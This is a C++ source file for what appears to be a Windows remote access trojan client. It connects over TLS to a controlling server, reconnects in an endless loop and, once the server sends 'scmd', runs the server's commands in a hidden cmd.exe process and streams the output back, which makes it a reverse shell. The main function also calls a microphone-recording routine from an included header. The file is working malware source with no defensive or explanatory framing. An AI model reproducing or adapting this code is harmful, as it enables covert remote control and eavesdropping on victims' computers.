
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <mutex>
#include <thread>
#include <io.h>
#include <filesystem>
#pragma comment(lib, "ws2_32.lib")
#include "features.h"

class Client {
public:
    Client(const std::string& serverIP, int serverPort)
            : serverIP(serverIP), serverPort(serverPort), clientSocket(INVALID_SOCKET), sslContext(nullptr), sslSocket(nullptr) {}
    void SendMessage(SSL* ssl, const char* buffer) {

        std::string input(buffer);
        const char* data = input.c_str();
        int bytesSent = 0;
        int totalBytes = input.length();
        while (bytesSent < totalBytes) {
            int bytesRemaining = totalBytes - bytesSent;
            int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
            if (SSL_write(ssl, data + bytesSent, bytesToSend) == -1) {

                break;
            }
            bytesSent += bytesToSend;
        }
    }
    void ReadOutputFromPipe(HANDLE pipeRead) {
        char pipeBuffer[4096];
        DWORD bytesRead;

        while (true) {
            if (!ReadFile(pipeRead, pipeBuffer, sizeof(pipeBuffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
                break;  // Error or end of input from the child process
            }

            pipeBuffer[bytesRead] = '\0';
            std::string output(pipeBuffer);
            SendMessage(sslSocket, output.c_str());
        }
    }

    void ExecCommand(const std::string& cmd, SOCKET sslSocket) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        HANDLE pipeRead, pipeWrite;
        if (!CreatePipe(&pipeRead, &pipeWrite, &sa, 0)) {
            std::string errorMessage = "Failed to create pipe: " + std::to_string(GetLastError());
            send(sslSocket, errorMessage.c_str(), errorMessage.length(), 0);
            return;
        }

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(STARTUPINFOA));
        si.cb = sizeof(STARTUPINFOA);
        si.hStdOutput = pipeWrite;  // Redirect child process's stdout to the write end of the pipe
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);  // Enable input from the user
        si.dwFlags |= STARTF_USESTDHANDLES;

        std::string fullCmd = "cmd.exe /C " + cmd; // Construct the full command

        if (!CreateProcessA(NULL, const_cast<char*>(fullCmd.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            std::string errorMessage = "Failed to create child process: " + std::to_string(GetLastError());
            send(sslSocket, errorMessage.c_str(), errorMessage.length(), 0);
            CloseHandle(pipeRead);
            CloseHandle(pipeWrite);
            return;
        }

        CloseHandle(pipeWrite);  // Close the write end of the pipe in the parent process

        // Create a separate thread for reading the child process output asynchronously
        std::thread readThread([&]() {
            ReadOutputFromPipe(pipeRead);
        });

        // Wait for the child process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Cleanup
        CloseHandle(pipeRead);  // Close the read end of the pipe in the parent process
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        readThread.join();  // Wait for the reading thread to finish
    }



    void ReceiveMessage(SSL* ssl) {
        int bytesRead;

        while (true) {
            bytesRead = SSL_read(sslSocket, buffer, sizeof(buffer) - 1);
            if (bytesRead <= 0) {
                break;
            }

            buffer[bytesRead] = '\0';
            std::cout << "Server response: " << buffer << std::endl;
            std::string command(buffer);
            cmd = std::string(buffer, bytesRead);

            if(cmd == "scmd")
                is_cmd = true;

            if(is_cmd == true)
                ExecCommand(cmd, reinterpret_cast<SOCKET>(sslSocket));

            if(cmd == "exit")
                is_cmd = false;

            if (cmd == "quit")
                break;

        }

    }

    bool Connect() {
        WSADATA wsData;
        if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
            std::cout << "Failed to initialize Winsock." << std::endl;
            return false;
        }

        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cout << "Failed to create socket." << std::endl;
            WSACleanup();
            return false;
        }

        sockaddr_in serverAddress{ };
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(serverPort);
        if (inet_pton(AF_INET, serverIP.c_str(), &(serverAddress.sin_addr)) <= 0) {
            std::cout << "Invalid address or address not supported." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {

            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        // Initialize OpenSSL
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();

        // Create SSL context
        const SSL_METHOD* method = SSLv23_client_method(); // Use SSLv23 method for compatibility
        sslContext = SSL_CTX_new(method);
        if (!sslContext) {
            std::cout << "Failed to create SSL context." << std::endl;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        // Attach SSL socket to the SSL context
        sslSocket = SSL_new(sslContext);
        if (!sslSocket) {
            std::cout << "Failed to create SSL socket." << std::endl;
            SSL_CTX_free(sslContext);
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        SSL_set_fd(sslSocket, clientSocket);

        // Perform SSL handshake
        if (SSL_connect(sslSocket) != 1) {

            SSL_free(sslSocket);
            SSL_CTX_free(sslContext);
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }

        return true;
    }

    void Run() {
        ReceiveMessage(sslSocket);

    }

    void Detach() {
        SSL_shutdown(sslSocket);
        SSL_free(sslSocket);
        SSL_CTX_free(sslContext);
        closesocket(clientSocket);
        WSACleanup();
    }

private:
    char buffer[4096];
    bool is_cmd;
    std::string cmd;
    std::string serverIP;
    int serverPort;
    SOCKET clientSocket;
    SSL_CTX* sslContext;
    SSL* sslSocket;
};

int main() {
    features feats;
    feats.RecordMicrophone();
    std::string serverIP = "127.0.0.1";
    int serverPort = 5555;
    Client client(serverIP, serverPort);
    while (true) {
        if (client.Connect()) {
            client.Run();
            client.Detach();
        }
    }
    return 0;
}